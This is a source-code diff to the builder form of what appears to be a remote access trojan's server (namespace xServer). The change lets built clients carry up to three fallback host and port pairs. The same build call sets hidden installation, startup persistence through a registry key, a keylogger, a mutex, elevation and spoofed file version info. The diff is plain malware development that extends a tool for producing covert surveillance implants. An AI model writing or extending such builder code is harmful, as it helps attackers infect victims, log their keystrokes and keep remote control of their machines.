@@ -39,9 +39,21 @@ namespace xServer.Forms
 
         private void LoadProfile(string profilename)
         {
+            char[] comma = {','};
+
             ProfileManager pm = new ProfileManager(profilename + ".xml");
-            txtHost.Text = pm.ReadValue("Hostname");
-            txtPort.Text = pm.ReadValue("ListenPort");
+            String hostsCsv = pm.ReadValue("Hostname") + ",,";
+            String[] hosts = hostsCsv.Split(comma);
+            txtHost1.Text = hosts[0];
+            txtHost2.Text = hosts[1];
+            txtHost3.Text = hosts[2];
+
+            String portsCsv = pm.ReadValue("ListenPort") + ",,";
+            String[] ports = portsCsv.Split(comma);
+            txtPort1.Text = ports[0];
+            txtPort2.Text = ports[1];
+            txtPort3.Text = ports[2];
+
             txtPassword.Text = pm.ReadValue("Password");
             txtDelay.Text = pm.ReadValue("Delay");
             txtMutex.Text = pm.ReadValue("Mutex");
@@ -67,11 +79,21 @@ namespace xServer.Forms
             _profileLoaded = true;
         }
 
+        String getAllHosts()
+        {
+            return txtHost1.Text + "," + txtHost2.Text + "," + txtHost3.Text;
+        }
+
+        String getAllPorts()
+        {
+            return txtPort1.Text + "," + txtPort2.Text + "," + txtPort3.Text;
+        }
+
         private void SaveProfile(string profilename)
         {
             ProfileManager pm = new ProfileManager(profilename + ".xml");
-            pm.WriteValue("Hostname", txtHost.Text);
-            pm.WriteValue("ListenPort", txtPort.Text);
+            pm.WriteValue("Hostname", getAllHosts());
+            pm.WriteValue("ListenPort", getAllPorts());
             pm.WriteValue("Password", txtPassword.Text);
             pm.WriteValue("Delay", txtDelay.Text);
             pm.WriteValue("Mutex", txtMutex.Text);
@@ -101,11 +123,10 @@ namespace xServer.Forms
             LoadProfile("Default");
             if (string.IsNullOrEmpty(txtMutex.Text))
             {
-                txtPort.Text = XMLSettings.ListenPort.ToString();
+                txtPort1.Text = XMLSettings.ListenPort.ToString();
                 txtPassword.Text = XMLSettings.Password;
                 txtMutex.Text = Helper.GetRandomName(32);
             }
-
             UpdateControlStates();
 
             txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
@@ -126,12 +147,6 @@ namespace xServer.Forms
         private void chkShowPass_CheckedChanged(object sender, EventArgs e)
         {
             txtPassword.PasswordChar = (chkShowPass.Checked) ? '\0' : '•';
-        }
-
-        private void txtPort_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
-                e.Handled = true;
         }
 
         private void txtDelay_KeyPress(object sender, KeyPressEventArgs e)
@@ -240,7 +255,7 @@ namespace xServer.Forms
 
         private void btnBuild_Click(object sender, EventArgs e)
         {
-            if (!string.IsNullOrEmpty(txtHost.Text) && !string.IsNullOrEmpty(txtPort.Text) &&
+            if (!string.IsNullOrEmpty(txtHost1.Text) && !string.IsNullOrEmpty(txtPort1.Text) &&
                 !string.IsNullOrEmpty(txtDelay.Text) && // Connection Information
                 !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text) && // Client Options
                 !chkInstall.Checked ||
@@ -298,9 +313,9 @@ namespace xServer.Forms
                             asmInfo[7] = txtFileVersion.Text;
                         }
 
-                        ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text,
+                        ClientBuilder.Build(output, getAllHosts(), txtPassword.Text, txtInstallsub.Text,
                             txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked,
-                            chkStartup.Checked, chkHide.Checked, chkKeylogger.Checked, int.Parse(txtPort.Text),
+                            chkStartup.Checked, chkHide.Checked, chkKeylogger.Checked, getAllPorts(),
                             int.Parse(txtDelay.Text),
                             GetInstallPath(), chkElevation.Checked, icon, asmInfo, Application.ProductVersion);
 
@@ -368,12 +383,32 @@ namespace xServer.Forms
             return match.Success;
         }
 
-        private void txtHost_TextChanged(object sender, EventArgs e)
+        private void txtHost1_TextChanged(object sender, EventArgs e)
         {
             HasChanged();
         }
 
-        private void txtPort_TextChanged(object sender, EventArgs e)
+        private void txtHost2_TextChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+        }
+
+        private void txtHost3_TextChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+        }
+
+        private void txtPort1_TextChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+        }
+
+        private void txtPort2_TextChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+        }
+
+        private void txtPort3_TextChanged(object sender, EventArgs e)
         {
             HasChanged();
         }
